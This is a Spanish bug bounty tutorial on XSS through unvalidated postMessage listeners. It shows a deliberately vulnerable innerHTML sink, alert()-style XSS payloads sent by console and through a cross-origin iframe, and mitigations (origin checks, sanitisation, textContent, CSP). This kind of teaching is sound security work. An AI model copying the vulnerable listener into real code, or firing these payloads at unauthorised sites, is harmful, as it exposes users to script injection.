# Bug Bounty XSS con postMessage

- **Source URL:** https://gorkaaa.medium.com/bug-bounty-xss-con-postmessage-cuando-la-confianza-entre-ventanas-se-convierte-en-vulnerabilidad-f18822acf0ab?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250826074432/https://gorkaaa.medium.com/bug-bounty-xss-con-postmessage-cuando-la-confianza-entre-ventanas-se-convierte-en-vulnerabilidad-f18822acf0ab
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10722 (id 10722)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Bug Bounty XSS con postMessage: cuando la confianza entre ventanas se convierte en vulnerabilidad

💞 **Si quieres contenido REAL de bug bounty**, no te puedes perder mi canal de YouTube: [https://www.youtube.com/@0xGorka](https://www.youtube.com/@0xGorka)

El objeto postMessage en JavaScript es una herramienta útil para comunicar distintas ventanas o iframes de manera segura.

El problema es que, cuando no se valida correctamente, puede abrir la puerta a ataques **XSS** (Cross-Site Scripting).

En este artículo aprenderás:

- Qué es postMessage y cómo funciona.
- Dónde suelen aparecer vulnerabilidades.
- Cómo explotarlas paso a paso.
- Qué medidas tomar para mitigarlas.

# 🧩 ¿Qué es postMessage?

Es un método de la API de Web Messaging que permite enviar mensajes entre documentos (ventanas, iframes o pestañas) aunque estén en dominios distintos.

Ejemplo básico:

```
// Enviando un mensaje
window.postMessage("Hola", "https://example.com");
```
```
// Recibiendo un mensaje
window.addEventListener("message", function(event) {
  console.log(event.data);
});
```
# ⚠️ El problema de seguridad

El riesgo aparece cuando la aplicación:

1. **Recibe mensajes sin validar el origen (event.origin).**
2. **Inserta directamente los datos recibidos en el DOM** (innerHTML, document.write, etc.).

Ejemplo vulnerable:

```
window.addEventListener("message", function(event) {
  document.body.innerHTML = event.data; // ❌ peligroso
});
```
En este caso, si un atacante logra inyectar un postMessage malicioso, puede ejecutar JavaScript arbitrario.

# 🛠️ Metodología de explotación

# 1. Identificar uso de postMessage

Busca en el código JavaScript (minificado o no) referencias a message y postMessage.

`grep -R "postMessage" *.js`
# 2. Enviar mensajes maliciosos

Usa la consola del navegador o un script para enviar un payload XSS:

`window.postMessage('<img src=x onerror=alert(1)>', '*');`
# 3. Validar ejecución

Si el valor inyectado aparece renderizado sin sanitización, se habrá ejecutado el XSS.

# 📂 Ejemplo práctico

Supongamos que un sitio integra un iframe en:

`<iframe src="https://victima.com/frame"></iframe>`
Y en victima.com/frame existe este código:

```
window.addEventListener("message", function(e) {
  document.getElementById("output").innerHTML = e.data;
});
```
Un atacante podría abrir el iframe desde su propio dominio y ejecutar:

```
document.querySelector("iframe").contentWindow.postMessage(
  "<script>alert('XSS')</script>", 
  "https://victima.com"
);
```
Resultado: ejecución arbitraria de JavaScript en el contexto de victima.com.

# 🔒 Mitigación

1. **Validar el origen** del mensaje:

```
window.addEventListener("message", function(event) {
  if (event.origin !== "https://trusted.com") return;
  // procesar mensaje seguro
});
```
1. **Escapar y sanitizar** el contenido recibido antes de inyectarlo en el DOM.
2. **Evitar innerHTML**: usar textContent u otros métodos seguros.
3. **Implementar CSP (Content Security Policy)** para limitar ejecución de scripts inyectados.

# 📌 Conclusión

El uso inseguro de postMessage convierte la comunicación entre ventanas en una puerta de entrada para ataques XSS.

Como bug bounty hunter, tu objetivo es detectar:

- Falta de validación del origen.
- Inserción directa de datos en el DOM.

Estos dos errores combinados son suficientes para escalar un simple mensaje en un **ataque crítico**.

#BugBounty #Ciberseguridad #XSS #PostMessage #HackingEtico #InfoSec #Pentesting #BugBountyHunter
